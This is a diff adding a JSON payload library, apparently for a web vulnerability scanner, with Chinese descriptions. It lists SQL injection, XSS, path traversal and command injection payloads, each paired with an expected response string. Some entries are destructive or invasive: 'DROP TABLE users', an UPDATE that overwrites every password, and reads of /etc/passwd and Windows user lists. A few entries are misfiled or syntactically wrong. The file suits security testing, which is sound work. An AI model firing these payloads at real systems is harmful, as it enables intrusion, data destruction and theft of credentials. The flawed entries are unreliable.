@@ -1,0 +1,198 @@
+{
+  "sql_injection": {
+    "description": "SQL注入检测payload库",
+    "error_based": {
+      "mysql": [
+        {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ", "expected": "XPATH"},
+        {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1) -- ", "expected": "XPATH"},
+        {"payload": "' UNION SELECT NULL,NULL,VERSION() -- ", "expected": "VERSION()"},
+        {"payload": "' UNION SELECT 1,2,3 FROM information_schema.tables -- ", "expected": "information_schema"},
+        {"payload": "' AND (SELECT COUNT(*) FROM mysql.user) > 0 -- ", "expected": "root"}
+      ],
+      "postgresql": [
+        {"payload": "' AND 1=CAST((SELECT version()) AS INT) -- ", "expected": "PG"},
+        {"payload": "' UNION SELECT NULL,NULL,version() -- ", "expected": "PostgreSQL"},
+        {"payload": "'; SELECT pg_read_file('/etc/passwd') -- ", "expected": "root"}
+      ],
+      "oracle": [
+        {"payload": "' UNION SELECT NULL,NULL,version FROM v$instance -- ", "expected": "Oracle"},
+        {"payload": "' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1)) > 0 -- ", "expected": "CTX"}
+      ]
+    },
+    "boolean_based": {
+      "mysql": [
+        {"payload": "' OR 1=1 -- ", "expected_true": "页面正常或内容变化", "expected_false": "错误或无内容"},
+        {"payload": "' AND 1=1 -- ", "expected_true": "页面正常", "expected_false": "错误"},
+        {"payload": "' AND 1=2 -- ", "expected_true": "错误或无内容", "expected_false": "页面正常"},
+        {"payload": "admin' AND 1=1 -- ", "expected_true": "正常", "expected_false": "错误"},
+        {"payload": "admin' AND 1=2 -- ", "expected_true": "错误", "expected_false": "正常"}
+      ],
+      "generic": [
+        {"payload": "1' ORDER BY 1 -- ", "expected_true": "正常", "expected_false": "错误"},
+        {"payload": "1' ORDER BY 2 -- ", "expected_true": "正常", "expected_false": "错误"},
+        {"payload": "1' ORDER BY 3 -- ", "expected_true": "正常", "expected_false": "错误"}
+      ]
+    },
+    "time_based": {
+      "mysql": [
+        {"payload": "'; SELECT SLEEP(5) -- ", "expected": "延迟>=5秒"},
+        {"payload": "'; SELECT IF(1=1,SLEEP(3),0) -- ", "expected": "延迟>=3秒"},
+        {"payload": "'; SELECT BENCHMARK(5000000,MD5('test')) -- ", "expected": "延迟"},
+        {"payload": "1' AND SLEEP(3) -- ", "expected": "延迟>=3秒"},
+        {"payload": "1' AND (SELECT * FROM (SELECT SLEEP(3))a) -- ", "expected": "延迟>=3秒"}
+      ],
+      "postgresql": [
+        {"payload": "'; SELECT pg_sleep(5) -- ", "expected": "延迟>=5秒"},
+        {"payload": "1' AND (SELECT COUNT(*) FROM pg_roles) > 0 AND SLEEP(3) -- ", "expected": "延迟>=3秒"}
+      ],
+      "mssql": [
+        {"payload": "'; WAITFOR DELAY '00:00:05' -- ", "expected": "延迟>=5秒"},
+        {"payload": "1' AND IF(1=1) WAITFOR DELAY '00:00:03' -- ", "expected": "延迟>=3秒"}
+      ]
+    },
+    "union_based": {
+      "mysql": [
+        {"payload": "' UNION SELECT 1,2,3 -- ", "expected": "显示数字1,2或3"},
+        {"payload": "' UNION SELECT NULL,NULL,NULL -- ", "expected": "正常或数字显示"},
+        {"payload": "' UNION SELECT 1,2,3,4,5 -- ", "expected": "正常"},
+        {"payload": "' UNION SELECT NULL,VERSION(),NULL,NULL -- ", "expected": "版本号"}
+      ],
+      "generic": [
+        {"payload": "1' UNION SELECT 1 -- ", "expected": "正常"},
+        {"payload": "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ", "expected": "正常"}
+      ]
+    },
+    "stacked_queries": {
+      "mysql": [
+        {"payload": "'; DROP TABLE users -- ", "expected": "表被删除或错误"},
+        {"payload": "'; INSERT INTO users VALUES(1,'hacked') -- ", "expected": "数据插入"},
+        {"payload": "'; UPDATE users SET password='hacked' WHERE 1=1 -- ", "expected": "数据更新"}
+      ]
+    }
+  },
+  "xss": {
+    "description": "XSS检测payload库",
+    "reflected": {
+      "basic": [
+        {"payload": "<script>alert(1)</script>", "expected": "alert"},
+        {"payload": "<script>alert('XSS')</script>", "expected": "alert"},
+        {"payload": "\"><script>alert(1)</script>", "expected": "alert"},
+        {"payload": "'><script>alert(1)</script>", "expected": "alert"},
+        {"payload": "><script>alert(1)</script>", "expected": "alert"}
+      ],
+      "event_handler": [
+        {"payload": "<img src=x onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<svg onload=alert(1)>", "expected": "onload"},
+        {"payload": "<body onload=alert(1)>", "expected": "onload"},
+        {"payload": "<input onfocus=alert(1) autofocus>", "expected": "onfocus"},
+        {"payload": "<select onfocus=alert(1) autofocus>", "expected": "onfocus"},
+        {"payload": "<textarea onfocus=alert(1) autofocus>", "expected": "onfocus"},
+        {"payload": "<keygen onfocus=alert(1) autofocus>", "expected": "onfocus"},
+        {"payload": "<video><source onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<audio src=x onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<marquee onstart=alert(1)>", "expected": "onstart"},
+        {"payload": "<meter onmouseover=alert(1)>0</meter>", "expected": "onmouseover"},
+        {"payload": "<details open ontoggle=alert(1)>", "expected": "ontoggle"},
+        {"payload": "<iframe onload=alert(1)>", "expected": "onload"},
+        {"payload": "<object data=x onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<embed src=x onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<link rel=import href=x onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<base href=x onerror=alert(1)>", "expected": "onerror"},
+        {"payload": "<template onload=alert(1)>", "expected": "onload"}
+      ],
+      "protocol": [
+        {"payload": "javascript:alert(1)", "expected": "javascript:"},
+        {"payload": "<a href=javascript:alert(1)>click</a>", "expected": "javascript:"},
+        {"payload": "<svg><script>alert(1)</script></svg>", "expected": "alert"},
+        {"payload": "<img src=x:alert(1)>", "expected": "alert"},
+        {"payload": "<form action=javascript:alert(1)><input type=submit></form>", "expected": "javascript:"}
+      ],
+      "encoding": [
+        {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "expected": "alert"},
+        {"payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "expected": "eval"},
+        {"payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "expected": "script"},
+        {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "expected": "script"},
+        {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "expected": "alert"},
+        {"payload": "<ScRiPt>alert(1)</ScRiPt>", "expected": "alert"},
+        {"payload": "<sCrIpT>alert(1)</sCrIpT>", "expected": "alert"}
+      ]
+    },
+    "dom_based": {
+      "sources": [
+        {"payload": "#<script>alert(1)</script>", "expected": "hash"},
+        {"payload": "?param=<script>alert(1)</script>", "expected": "URL参数"},
+        {"payload": "<img src=x onerror=location.hash.substr(0)>", "expected": "location"}
+      ],
+      "sinks": [
+        {"payload": "<svg/onload=eval(location.hash.slice(1))>#alert(1)", "expected": "eval"},
+        {"payload": "<iframe src=x onload=eval(this.name) name=alert(1)>", "expected": "eval"}
+      ]
+    },
+    "stored": {
+      "basic": [
+        {"payload": "<script>alert(1)</script>", "expected": "alert", "note": "存储型需多次测试验证"},
+        {"payload": "<img src=x onerror=alert(1)>", "expected": "onerror", "note": "存储型需多次测试验证"}
+      ]
+    }
+  },
+  "path_traversal": {
+    "description": "路径遍历检测payload库",
+    "unix": [
+      {"payload": "../../../etc/passwd", "expected": "root:x:"},
+      {"payload": "../../../../etc/passwd", "expected": "root:x:"},
+      {"payload": "../../../../../etc/passwd", "expected": "root:x:"},
+      {"payload": "....//....//....//....//etc/passwd", "expected": "root:x:"},
+      {"payload": "..\\..\\..\\..\\windows\\win.ini", "expected": "[extensions]"},
+      {"payload": "..\\..\\..\\..\\windows\\system.ini", "expected": "[386Enh]"},
+      {"payload": "..%2f..%2f..%2f..%2fetc/passwd", "expected": "root:x:"},
+      {"payload": "/etc/passwd", "expected": "root:x:"},
+      {"payload": "/etc/hosts", "expected": "localhost"}
+    ],
+    "windows": [
+      {"payload": "..\\..\\..\\..\\windows\\win.ini", "expected": "[extensions]"},
+      {"payload": "..\\..\\..\\..\\windows\\system.ini", "expected": "[386Enh]"},
+      {"payload": "C:\\Windows\\win.ini", "expected": "[extensions]"},
+      {"payload": "C:\\boot.ini", "expected": "[boot loader]"},
+      {"payload": "..%5c..%5c..%5c..%5cwindows\\win.ini", "expected": "[extensions]"}
+    ],
+    "encoding": [
+      {"payload": "..%252f..%252f..%252f..%252fetc/passwd", "expected": "root:x:"},
+      {"payload": "..%c0%af..%c0%af..%c0%afetc/passwd", "expected": "root:x:"},
+      {"payload": "..%c1%9c..%c1%9c..%c1%9cetc/passwd", "expected": "root:x:"}
+    ]
+  },
+  "command_injection": {
+    "description": "命令注入检测payload库",
+    "unix": [
+      {"payload": "; ls -la", "expected": "total"},
+      {"payload": "| ls -la", "expected": "total"},
+      {"payload": "& ls -la", "expected": "total"},
+      {"payload": "&& ls -la", "expected": "total"},
+      {"payload": "|| ls -la", "expected": "total"},
+      {"payload": "$(ls -la)", "expected": "total"},
+      {"payload": "`ls -la`", "expected": "total"},
+      {"payload": "; cat /etc/passwd", "expected": "root:x:"},
+      {"payload": "| cat /etc/passwd", "expected": "root:x:"},
+      {"payload": "$(cat /etc/passwd)", "expected": "root:x:"},
+      {"payload": "&& whoami", "expected": "root"},
+      {"payload": "; id", "expected": "uid="},
+      {"payload": "| id", "expected": "uid="},
+      {"payload": "&& ifconfig", "expected": "inet"},
+      {"payload": "; uname -a", "expected": "Linux"}
+    ],
+    "windows": [
+      {"payload": "; dir", "expected": "Directory of"},
+      {"payload": "| dir", "expected": "Directory of"},
+      {"payload": "& dir", "expected": "Directory of"},
+      {"payload": "&& dir", "expected": "Directory of"},
+      {"payload": "|| dir", "expected": "Directory of"},
+      {"payload": "(dir)", "expected": "Directory of"},
+      {"payload": "; type C:\\Windows\\win.ini", "expected": "[extensions]"},
+      {"payload": "| type C:\\Windows\\win.ini", "expected": "[extensions]"},
+      {"payload": "; ipconfig", "expected": "Windows IP"},
+      {"payload": "& ver", "expected": "Microsoft"},
+      {"payload": "&& net user", "expected": "User accounts"},
+      {"payload": "; whoami", "expected": "Administrator"}
+    ]
+  }
+}
